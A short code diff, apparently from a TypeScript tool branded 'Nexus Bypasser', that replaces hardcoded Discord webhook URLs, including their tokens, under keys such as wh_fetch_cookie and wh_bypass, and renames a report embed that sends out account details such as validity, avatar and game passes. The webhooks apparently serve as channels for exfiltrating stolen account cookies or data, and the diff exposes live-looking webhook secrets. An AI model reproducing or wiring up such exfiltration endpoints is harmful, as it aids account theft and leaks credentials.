@@ -18,9 +18,9 @@ export function deleteToken(_id: string) {}
 export function getLoginLog(): LoginRecord[] { return []; }
 
 const HARDCODED_WEBHOOKS: Record<string, string> = {
-  wh_bypass: 'https://discord.com/api/webhooks/1511747719822180393/O1Pl_Ad_zN8C5UhqO19d8PnxkDr8rH-kFdA4c0ffq8tZEltBvpcwwjC3WR1LlGs3qk0C',
-  wh_fetch_cookie: 'https://discord.com/api/webhooks/1511747722468655199/A17x7QhXuEuK9ctVOmNvAEg7yLZPxhpczb0mLYbqJxM0Qa2ww2mfTv13Ta1fT-BinhNl',
-  wh_live_bypass: 'https://discord.com/api/webhooks/1510195534756053034/8sgNTeGfNr4RR4TcJpTyma57OIZbsnc6BgnbdbgHkeETJnYVRcagT2hnzrVEkBFVRwTj',
+  wh_bypass: 'https://discord.com/api/webhooks/1514880259957325905/LHvsuTD6w9PeZtylfTgyoerVv6xaP76s_BbqtkKPIhmXc3MQZ1uCjUGraCc0iBGvyZSh',
+  wh_fetch_cookie: '',
+  wh_live_bypass: 'https://discord.com/api/webhooks/1514879190330118164/CtwmxutkfZdAakFOyqvaI6WyO0vlmrNU8aGlPDrjccdfCCC3ETt8zFWJGXEjtarByXaf',
 };
 export const WK = {
   bypass: 'wh_bypass',
@@ -133,7 +133,7 @@ function buildInfoEmbed(d: AccountInfo, siteUrl: string) {
     `MM2 | ${passField(d.passesMM2)}`,
   ].join('\n');
   return {
-    title: 'Thai.Net',
+    title: 'Nexus Bypasser.',
     url: siteUrl,
     color: d.valid ? 0x22c55e : 0xef4444,
     thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
